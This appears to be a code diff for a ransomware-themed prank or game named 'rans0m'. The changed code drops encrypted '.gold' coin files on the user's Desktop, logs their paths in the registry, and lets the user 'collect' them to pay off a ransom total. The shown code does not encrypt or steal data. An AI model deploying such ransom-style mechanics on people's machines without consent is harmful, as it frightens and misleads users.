@@ -10,44 +10,50 @@ namespace rans0m
     {
         private const string RegistryValueName = "GoldCoins"; // REG_MULTI_SZ
 
+        public sealed record CoinDef(string Path, int Value, bool IsHoneyPot);
+
+        /// <summary>Coin face values matching Gold_X.png files in the exe dir.</summary>
+        public static readonly int[] CoinValues = new[] { 5, 10, 25, 50, 75, 100 };
+
+        public const double HoneyPotChance = 0.05;
+
         /// <summary>
-        /// Creates a specified number of .gold files in random user folders.
-        /// Each file contains an encrypted JSON object: {"RANSOM_COIN": "randomString"}.
-        /// Paths are stored in the registry for later deletion.
-        /// Fixed: thread-safe rng, validates dirs writable, skips system dirs, limits retries
+        /// Creates coins DESKTOP-ONLY per request. Drops .gold files directly on
+        /// the user's Desktop (no subfolders, no Documents/Music/etc).
+        /// Each file: {"RANSOM_COIN": id, "VALUE": 5/10/25/50/75/100, "HONEY": 0/1}.
+        /// 5% of coins are Honey_Pot (pays the full 500 requirement).
+        /// Returns the created coin definitions (path + value + honeypot flag).
         /// </summary>
-        public static void CreateRandomCoins(int count)
+        public static List<CoinDef> CreateRandomCoins(int count)
         {
-            List<string> baseDirs = GetUserDirectories();
-            if (baseDirs.Count == 0) return;
+            var created = new List<CoinDef>();
+            string desktop = GetDesktopDir();
+            if (string.IsNullOrEmpty(desktop) || !Directory.Exists(desktop)) return created;
+            try { Directory.CreateDirectory(desktop); } catch { return created; }
+            if (!HasWriteAccess(desktop)) return created;
 
             List<string> createdPaths = new List<string>();
 
             for (int i = 0; i < count; i++)
             {
-                bool created = false;
-                // Try up to 3 different base dirs to improve success rate
-                for (int attempt = 0; attempt < 3 && !created; attempt++)
+                bool done = false;
+                for (int attempt = 0; attempt < 3 && !done; attempt++)
                 {
                     try
                     {
-                        string baseDir = baseDirs[Global.RngNext(baseDirs.Count)];
-                        string targetDir = GetRandomSubfolder(baseDir);
-                        try { Directory.CreateDirectory(targetDir); }
-                        catch { continue; }
-
-                        // Verify we can write there (avoid OneDrive sync issues etc)
-                        if (!HasWriteAccess(targetDir)) continue;
+                        // Desktop root only - no subfolder wandering
+                        string targetDir = desktop;
 
                         string randomString = Guid.NewGuid().ToString("N");
-                        // Random coin value among 25,30,50,75,100 per user request (500 total)
-                        int[] values = new[] { 25, 30, 50, 75, 100 };
-                        int coinValue = values[Global.RngNext(values.Length)];
+                        bool honey = Global.RngNext(100) < 5; // 5% Honey_Pot
+                        int coinValue = honey ? Global.RansomTarget
+                            : CoinValues[Global.RngNext(CoinValues.Length)];
 
                         Dictionary<string, string> payload = new()
                         {
                             { "RANSOM_COIN", randomString },
-                            { "VALUE", coinValue.ToString() }
+                            { "VALUE", coinValue.ToString() },
+                            { "HONEY", honey ? "1" : "0" }
                         };
 
                         string json = JsonSerializer.Serialize(payload);
@@ -65,7 +71,8 @@ namespace rans0m
                         if (!File.Exists(fullPath)) continue;
 
                         createdPaths.Add(fullPath);
-                        created = true;
+                        created.Add(new CoinDef(fullPath, coinValue, honey));
+                        done = true;
                     }
                     catch { } // skip coin on error
                 }
@@ -73,6 +80,7 @@ namespace rans0m
 
             if (createdPaths.Count > 0)
                 AppendToRegistryList(createdPaths);
+            return created;
         }
 
         /// <summary>
@@ -130,6 +138,99 @@ namespace rans0m
             var dict = JsonSerializer.Deserialize<Dictionary<string, string>>(json);
             if (dict == null || !dict.ContainsKey("RANSOM_COIN")) throw new InvalidDataException("Invalid gold file content");
             return dict;
+        }
+
+        public sealed record CollectResult(int Value, bool IsHoneyPot, int SavedCredit);
+
+        /// <summary>
+        /// Collect a single coin by file path (click-to-collect, no drag needed).
+        /// Honey_Pot pays the FULL remaining requirement; any amount beyond what
+        /// is needed is saved into Global.goldCredit for the next ransom.
+        /// </summary>
+        public static CollectResult CollectCoinFile(string filePath)
+        {
+            try
+            {
+                if (string.IsNullOrWhiteSpace(filePath)) return new CollectResult(0, false, 0);
+                if (!filePath.EndsWith(".gold", StringComparison.OrdinalIgnoreCase)) return new CollectResult(0, false, 0);
+                if (!File.Exists(filePath)) return new CollectResult(0, false, 0);
+                Dictionary<string, string> data;
+                try { data = DecryptCoinFile(filePath); }
+                catch { return new CollectResult(0, false, 0); }
+                if (!data.TryGetValue("RANSOM_COIN", out var coinId)) return new CollectResult(0, false, 0);
+                lock (Global.usedCoins)
+                {
+                    if (Global.usedCoins.Contains(coinId)) return new CollectResult(0, false, 0);
+                    Global.usedCoins.Add(coinId);
+                }
+                int coinValue = 100;
+                if (data.TryGetValue("VALUE", out var vs) && int.TryParse(vs, out var p)) coinValue = p;
+                else if (data.TryGetValue("COIN_VALUE", out var vs2) && int.TryParse(vs2, out var p2)) coinValue = p2;
+                bool honey = data.TryGetValue("HONEY", out var h) && h == "1";
+
+                int before = Global.ransomLeft;
+                int applied = Math.Min(coinValue, before);
+                int overpay = Math.Max(0, coinValue - before);
+                Global.ransomLeft = before - applied;
+                int saved = 0;
+                if (overpay > 0)
+                {
+                    Global.goldCredit += overpay;
+                    saved = overpay;
+                    FileLogger.Log($"[Gold] Overpay {overpay} saved as credit (total {Global.goldCredit})");
+                }
+                try { File.Delete(filePath); } catch { }
+                try { RemoveFromRegistryList(filePath); } catch { }
+                if (honey) FileLogger.Log($"[Gold] Honey_Pot collected! Paid {applied}, saved {saved}");
+                return new CollectResult(applied, honey, saved);
+            }
+            catch { return new CollectResult(0, false, 0); }
+        }
+
+        /// <summary>
+        /// Collect any one unused desktop coin (used by clickable overlay coins).
+        /// </summary>
+        public static CollectResult CollectAnyDesktopCoin()
+        {
+            try
+            {
+                string desktop = GetDesktopDir();
+                if (string.IsNullOrEmpty(desktop) || !Directory.Exists(desktop)) return new CollectResult(0, false, 0);
+                string[] files;
+                try { files = Directory.GetFiles(desktop, "*.gold"); } catch { return new CollectResult(0, false, 0); }
+                foreach (var f in files)
+                {
+                    var r = CollectCoinFile(f);
+                    if (r.Value > 0) return r;
+                }
+                return new CollectResult(0, false, 0);
+            }
+            catch { return new CollectResult(0, false, 0); }
+        }
+
+        public static string GetDesktopDir()
+        {
+            try
+            {
+                string d = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
+                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
+                d = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                if (!string.IsNullOrEmpty(d) && Directory.Exists(d)) return d;
+            }
+            catch { }
+            return "";
+        }
+
+        private static void RemoveFromRegistryList(string path)
+        {
+            try
+            {
+                var list = GetRegistryFileList();
+                if (list == null) return;
+                list.RemoveAll(p => p.Equals(path, StringComparison.OrdinalIgnoreCase));
+                SetRegistryFileList(list);
+            }
+            catch { }
         }
 
         // ----------------------------- INTERNAL HELPERS -----------------------------
